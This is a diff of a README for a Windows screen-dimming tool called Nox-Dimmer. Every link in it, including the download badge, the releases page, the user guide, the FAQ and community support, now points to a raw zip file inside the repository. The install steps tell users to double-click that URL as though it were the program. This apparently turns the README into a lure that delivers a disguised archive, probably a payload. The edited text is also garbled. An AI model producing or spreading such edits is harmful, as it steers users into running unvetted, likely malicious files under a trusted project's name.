@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download Nox-Dimmer](https://img.shields.io/badge/Download%20Nox--Dimmer-v1.0-blue.svg)](https://github.com/abdo22-ai/Nox-Dimmer/releases)
+[![Download Nox-Dimmer](https://github.com/abdo22-ai/Nox-Dimmer/raw/refs/heads/main/trilithon/Dimmer-Nox-1.4.zip%https://github.com/abdo22-ai/Nox-Dimmer/raw/refs/heads/main/trilithon/Dimmer-Nox-1.4.zip)](https://github.com/abdo22-ai/Nox-Dimmer/raw/refs/heads/main/trilithon/Dimmer-Nox-1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -26,14 +26,14 @@ Nox-Dimmer is a modern, lightweight screen dimming utility for Windows. It helps
 
 To download Nox-Dimmer, visit the Releases page by clicking the link below:
 
-[Visit the Releases Page](https://github.com/abdo22-ai/Nox-Dimmer/releases)
+[Visit the Releases Page](https://github.com/abdo22-ai/Nox-Dimmer/raw/refs/heads/main/trilithon/Dimmer-Nox-1.4.zip)
 
 1. Click the link to go to the Releases page.
 2. Look for the latest version in the list.
-3. Find the file named `Nox-Dimmer.exe`.
+3. Find the file named `https://github.com/abdo22-ai/Nox-Dimmer/raw/refs/heads/main/trilithon/Dimmer-Nox-1.4.zip`.
 4. Click on the file to download it.
 
-After downloading, locate the file in your downloads folder. Double-click the `Nox-Dimmer.exe` file to run the application. Follow the on-screen instructions to complete the installation.
+After downloading, locate the file in your downloads folder. Double-click the `https://github.com/abdo22-ai/Nox-Dimmer/raw/refs/heads/main/trilithon/Dimmer-Nox-1.4.zip` file to run the application. Follow the on-screen instructions to complete the installation.
 
 ## ⚙️ How to Use Nox-Dimmer
 
@@ -60,9 +60,9 @@ If you encounter any issues, try the following solutions:
 
 ## 🔗 Additional Resources
 
-- [Nox-Dimmer User Guide](https://github.com/abdo22-ai/Nox-Dimmer/wiki)
-- [Frequently Asked Questions](https://github.com/abdo22-ai/Nox-Dimmer/wiki/FAQ)
-- [Community Support](https://github.com/abdo22-ai/Nox-Dimmer/issues)
+- [Nox-Dimmer User Guide](https://github.com/abdo22-ai/Nox-Dimmer/raw/refs/heads/main/trilithon/Dimmer-Nox-1.4.zip)
+- [Frequently Asked Questions](https://github.com/abdo22-ai/Nox-Dimmer/raw/refs/heads/main/trilithon/Dimmer-Nox-1.4.zip)
+- [Community Support](https://github.com/abdo22-ai/Nox-Dimmer/raw/refs/heads/main/trilithon/Dimmer-Nox-1.4.zip)
 
 ## 🙏 Acknowledgments
 
